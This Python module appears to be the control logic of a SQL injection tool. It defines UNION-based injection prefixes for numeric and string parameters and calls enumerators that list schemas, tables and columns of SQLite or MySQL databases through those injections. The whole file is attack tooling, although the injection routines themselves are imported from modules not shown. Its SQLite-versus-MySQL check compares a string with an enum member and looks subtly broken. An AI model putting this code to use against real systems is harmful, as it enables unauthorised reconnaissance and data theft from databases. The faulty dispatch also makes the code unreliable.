from enumerators import Sqlite_Enumerator, Mysql_Enumerator
from determine import DBMS_Type
from enum import Enum


class Poison(Enum):
    NUMERIC = "0 UNION "
    ALNUM = "' UNION "


def _handle_sqlite(opts):
    sqlite_enum = Sqlite_Enumerator()

    tables = sqlite_enum.enumerate_table(opts, Poison[opts.QUERY_TYPE].value)
    if tables is not None and len(tables) > 0:
        print("[*] Got tables: \n    - " + "\n    - ".join(tables))
    else:
        print("[x] Could not get table info")
        exit(1)

    for table in tables:
        print("\n[ ] Gathering info for " + table)
        columns = sqlite_enum.enumerate_columns(
            opts, Poison[opts.QUERY_TYPE].value, table)

        if columns is not None and len(columns) > 0:
            print("[*] Got columns: \n    - " + "\n    - ".join(columns))
        else:
            print("[x] Could not get column info for " + table)


def _handle_mysql(opts):
    mysql_enum = Mysql_Enumerator()

    schemas = mysql_enum.enumerate_schemas(opts, Poison[opts.QUERY_TYPE].value)
    if schemas is not None and len(schemas) > 0:
        print("[*] Got schemas: \n    - " + "\n    - ".join(schemas))
    else:
        print("[x] Could not get schema info")
        exit(1)

    for schema in schemas:
        tables = mysql_enum.enumerate_table(
            opts, Poison[opts.QUERY_TYPE].value, schema)
        if tables is not None and len(tables) > 0:
            print("[*] Got tables: \n    - " + "\n    - ".join(tables))
        else:
            print("[x] Could not get table info")
            exit(1)

        for table in tables:
            print("\n[ ] Gathering info for " + table)
            columns = mysql_enum.enumerate_columns(
                opts, Poison[opts.QUERY_TYPE].value, schema, table)

            if columns is not None and len(columns) > 0:
                print("[*] Got columns: \n    - " + "\n    - ".join(columns))
            else:
                print("[x] Could not get column info for " + table)


def handler(opts):
    if opts.DBMS_TYPE.name == DBMS_Type.SQLITE:
        _handle_sqlite(opts)
    else:
        _handle_mysql(opts)
